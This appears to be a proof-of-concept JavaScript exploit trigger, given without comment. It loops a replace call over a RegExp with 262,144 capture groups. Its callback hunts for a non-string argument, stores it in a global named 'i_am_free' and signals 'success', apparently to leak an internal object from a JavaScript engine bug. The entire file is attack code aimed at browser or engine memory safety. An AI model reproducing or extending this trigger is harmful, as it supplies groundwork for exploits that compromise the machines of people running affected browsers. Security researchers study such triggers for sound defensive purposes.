function i_want_to_break_free() {
    var n = 262144;
    var m = 10;
    const v9 = new RegExp(("(ab)").repeat(n), "g");
    var regex = v9;
    var part = ("ab").repeat(n);
    var s = (part + "|").repeat(m);
    while (true) {
        var cnt = 0;
        var ary = [];
        function f23() {
            for (let i25 = 1; i25 < (arguments.length - 2); ++i25) {
                if (typeof arguments[i25] !== "string") {
                    i_am_free = arguments[i25];
                    throw "success";
                }
                const v44 = arguments[i25];
                ary[cnt++] = v44;
            }
            return "x";
        }
        s.replace(regex, f23);
    }
}
try {
    i_want_to_break_free();
} catch(e49) {
}
console.log(typeof i_am_free);
